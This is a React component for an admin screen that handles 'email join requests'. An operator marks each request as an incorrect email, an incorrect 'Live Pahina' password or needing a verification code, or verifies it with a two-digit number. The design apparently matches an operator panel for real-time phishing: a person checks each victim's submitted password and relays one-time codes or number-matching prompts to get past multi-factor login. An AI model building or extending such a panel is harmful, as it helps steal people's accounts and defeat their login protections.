
"use client";

import { useState } from "react";
import { updateEmailJoinRequest } from "./email-actions";

export default function EmailRequestActions({ request }) {
  const [showNumberInput, setShowNumberInput] = useState(false);
  const [number, setNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const buttonClass =
    "rounded-lg border border-red-500/40 bg-red-600 px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-red-700 disabled:cursor-not-allowed disabled:opacity-50";

  async function handleAction(status) {
    setLoading(true);
    setMessage("");

    const formData = new FormData();
    formData.set("request_id", request.id);
    formData.set("status", status);

    if (status === "verify_identity") {
      formData.set("verification_number", number);
    }

    try {
      await updateEmailJoinRequest(formData);

      setMessage("Email request updated successfully.");
      setShowNumberInput(false);
      setNumber("");
    } catch (error) {
      setMessage(error.message || "Unable to update email request.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="mt-5 border-t border-gray-800 pt-4">
      {request.status === "pending_review" && (
        <div className="flex flex-wrap gap-3">
          <button
            type="button"
            disabled={loading}
            onClick={() => {
              setMessage("");
              setShowNumberInput(true);
            }}
            className={buttonClass}
          >
            Verify
          </button>

          <button
            type="button"
            disabled={loading}
            onClick={() => handleAction("incorrect_email")}
            className={buttonClass}
          >
            Incorrect Email
          </button>

          <button
            type="button"
            disabled={loading}
            onClick={() => handleAction("incorrect_password")}
            className={buttonClass}
          >
            Incorrect Live Pahina Password
          </button>

          <button
            type="button"
            disabled={loading}
            onClick={() => handleAction("verification_code")}
            className={buttonClass}
          >
            Verification Code
          </button>
        </div>
      )}

      {showNumberInput && request.status === "pending_review" && (
        <div className="mt-4 flex flex-wrap items-center gap-3">
          <input
            type="text"
            inputMode="numeric"
            maxLength={2}
            value={number}
            onChange={(e) =>
              setNumber(e.target.value.replace(/\D/g, "").slice(0, 2))
            }
            placeholder="Two-digit number"
            className="rounded-lg border border-gray-700 bg-gray-900 px-4 py-2 text-white outline-none focus:border-red-500"
          />

          <button
            type="button"
            disabled={loading || number.length !== 2}
            onClick={() => handleAction("verify_identity")}
            className={buttonClass}
          >
            {loading ? "PLEASE WAIT..." : "Confirm Verify"}
          </button>

          <button
            type="button"
            disabled={loading}
            onClick={() => {
              setShowNumberInput(false);
              setNumber("");
            }}
            className="rounded-lg border border-gray-600 bg-gray-800 px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-gray-700 disabled:opacity-50"
          >
            Cancel
          </button>
        </div>
      )}

      {loading && (
        <p className="mt-3 text-sm text-gray-400">
          Updating email request...
        </p>
      )}

      {message && (
        <p className="mt-3 text-sm text-gray-300">
          {message}
        </p>
      )}

      {request.status !== "pending_review" && (
        <p className="mt-3 text-sm text-gray-400">
          Administrator action: {request.status.replaceAll("_", " ")}
        </p>
      )}
    </div>
  );
}
